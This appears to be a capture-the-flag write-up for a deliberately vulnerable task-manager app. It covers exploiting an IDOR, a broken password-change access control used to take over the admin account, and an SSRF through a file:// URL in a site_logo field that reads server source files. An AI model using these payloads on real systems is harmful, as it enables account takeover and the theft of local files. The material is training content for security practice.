We are working on this amazing new task manager app called Taskist Pro. Our devs claim the app is secure, we want you to take a look at it and see if you can leak the flag hidden inside the admin account.

http://taskist.pwn.site:1337/

IDOR on the task number like /123, just intruder it. Got distracted doing it with password changes first. 

Flag 1

flag{Id0rs_1n_4Pi5_ftW_45345}

Broken RBAC on the password change function, aka where I started this first, so I was right the entire time. But do GETs first to find the right acount ID, then used that to only have to do one password change with admin ID number, as opposed to brute forcing that one from the get go. 

Admin password: br0k3n_p4ss_c0ntr0l_l0gin

Flag 2

flag{br0k3n_acc3ss_c0ntrolz_43534}

Checking Import function

Upload a correct JSON config file, and receive an error that the PNG in config is not accepted. 

```http
POST /import HTTP/1.1
Host: taskist.pwn.site:1337
Content-Length: 578
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://taskist.pwn.site:1337
Referer: http://taskist.pwn.site:1337/site_config
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2NCwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTcwOTIzNDc4OX0.N95u86qtWwIFqbgfk-UwiOVR-Tf39TxunS5X2JRy4ng
Connection: close

{
	"site_name":"Taskist Pro",
	"site_logo":"https://i.imgur.com/bwV4a0B.png",
	"under_maintenance":"No",
	"site_meta_desc":"Join million people and teams that organize, plan, and collaborate on tasks and projects with Taskist. \\'The best to-do list\\' by The Verge.",
	"site_meta_keyw":"Task Manager, Taskist, Taskist Pro",
	"site_robots_txt":"Index, Follow",
	"send_mail_enabled":"No",
	"send_mail_mailer":"SMTP",
	"mail_from_name":"admin@taskistpro.ts",
	"smtp_security":"SSL",
	"smtp_hostname":"smtp.taskistpro.ts",
	"smtp_port":"465",
	"smtp_username":"admin@taskistpro.ts",
	"smtp_password":"abc123"}
```

The PNG error draws attention to the site_logo value which looks to allow a full URL and attempt to fetch it from the internet. This could indicate and SSRF.

Can use both HTTP protocol to try to request another site, or can use file:// protocol to attempt to read local files. To test, try to fetch files that we know exist, such as any of the .js files from the homepage.

Since it is an SSRF where the whole path will be needed, we will need to specify the exact location. Typically we might try something like /var/www as the webroot, but in this scenario there is a hint in the admin's tasks saying they haven't moved the webroot from /app/ to /var/www, so we to try for something like /static/js/dashboard.js in the /app/ directory with the file:// protocol. 

`"site_logo":"file:///app/static/js/dashboard.js",`

This shows the contents of the dashboard.js file. 

Now lets try to use this to view other interesting source code, like the page we're on, site_config.js. 

```js
const express       = require('express');
const app           = express();
const path          = require('path');
const cookieParser  = require('cookie-parser');
const nunjucks      = require('nunjucks');
const routes        = require('./routes');
const Database      = require('./database');
global.db           = new Database();

const flagHere = \"flag{bl3ss_7hy_libcurl_pro7oco1s_43454}\"

const db = new Database('taskist-pro.db');

app.use(express.json());

app.use(cookieParser());

app.disable('etag');
app.disable('x-powered-by');

nunjucks.configure('views', {
\tautoescape: true,
\texpress: app
});

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
\treturn res.status(404).send({
\t\tmessage: '404 page not found'
\t});
});

app.use((err, req, res, next) => {
    return res.status(400).send({
        message: 'Bad Request'
    });
});

(async () => {
\tawait global.db.connect();

\tapp.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
"

```

